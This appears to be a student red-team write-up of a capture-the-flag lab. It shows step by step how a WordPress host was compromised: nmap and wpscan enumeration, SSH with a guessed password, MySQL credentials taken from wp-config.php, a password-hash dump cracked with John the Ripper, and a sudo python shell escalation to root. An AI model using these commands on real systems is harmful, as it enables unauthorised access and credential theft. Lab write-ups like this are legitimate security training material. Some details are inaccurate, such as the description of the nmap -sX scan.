# Red Team: Summary of Operations

## Table of Contents

* Exposed Services
* Critical Vulnerabilities
* Exploitation

### Exposed Services

Network scan results for each machine reveal the below services and OS details

* `nmap -sT 192.168.1.0/24` --- command performs full TCP scan.
* `nmap -A 192.168.1.0/24` --- command performs an aggresive scan detecting OS, versions, services, scripts, and traceroute.
* `nmap -sX 192.168.1.0/24` --- command identifies all open ports.

![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/nmap_scan_report.png)

![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/nmapscan.PNG)

Nmap scan identifies the services below as potential points of entry:

Target 1
* Port 22 (SSH)
* Port 80 (Web)
* Port 111 (RPC)
* Port 139 (NetBIOS)
* Port 445 (SMB)
* Port 4444 (TCP)

The following vulnerabilities were discovered on the targets:

* Port 22 is open and not filtered; this provides the ability to SSH with discovered credentials.
* Port 80 is open and not filtered; this provides access to the web server and exposed services that are running on the server.
* Port 111 is open and not filtered; this provides the ability to expolit the RPC service.
* Exposed service:
	- 192.168.1.110/wordpress/

### Exploitation

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
* Names, Usersnames, passwords, any additional data stored on XCORP's systems.

### Exploit Used
* WPSCAN to enumerate a list of users target.
* 192.168.1.110/wordpress/
* `wpscan --url http://192.168.1.110/wordpress --enumerate u`

![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/wpscan.png)

* wpscan to enumerate users, which helps identify the users to target.
	- Michael
	- Steven

* Used social engineering and brute force to obtain password
	- `$ssh michael@192.168.1.110`
	- password: `"michael"`

	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/michael.png)

* First flag was discovered in "service.html" file located under the "var/www/html" directory as michael.
	- Flag 1.txt:

	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/Flag1.PNG)

* Second flag was discovered in the "/var/www" directory.
	- Flag2.txt:

	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/flag2.PNG)

* Discovered login and password root credentials under configuration and authentication files under "wp" directory.
	- Credentials located in "wp-config.php" file under "/var/www/html/wordpress" directory.
	
	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/sql_login.png)

* SQL Database credentials:
	- username:root
	- password:R@v3nSecurity
* Utilized SQL
	- Login into SQL database: `$mysql -u root -p`
	- password: `R@v3nSecurity`

	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/utilizing_sql.png)

* Gained access to information stored in SQL database and navigated across to obtain user password hashes.
	- `$show database;`
	- `$use wordpress;`
	- `$show tables;`
	- `$select * from wp_posts;`
* Discovered flags 3 and 4 in SQL database which contain password hashes for both Steven and Michael.
	- Flag 3 & 4.txt:
	
	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/flags_3_4.png)

* Navigate to user tables to dump password hashes.
	- `$show tables;`
	- `$select * from wp_users;`
* Discovered users' hashed passwords.
	
	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/hashed_passwords.png)

* Copied and pasted corresponding hashes into a plain text file in Kali.
	- `$nano wp_hashes.txt`
	
	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/nano_hashes.png)

* Cracked the password hashes with John-Ripper.
	- `$john wp_hashes.txt`
	
	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/john.PNG)

* Discovered Steven's password
	- password: pink84
	
	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/john.PNG)

* Gained remote access to Steven's machine via SSH.
	- `$ssh steven@192.168.1.110`
	- password: `pink84`
* Ran sudo python script to escalate user privileges.
	- `$ sudo python -c 'import pty;pty.spawn("/bin/bash")'`
	
	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/sudo_python.png)

* Located final flag.
	- `$ cd /root`
	- `$ ls -l`
	- `$ cat flag4.txt`
* Flag4.txt:

	![Diagram](https://github.com/aele1401/XCRP_PenTest/blob/main/RvB/Images/target_rooted.png)


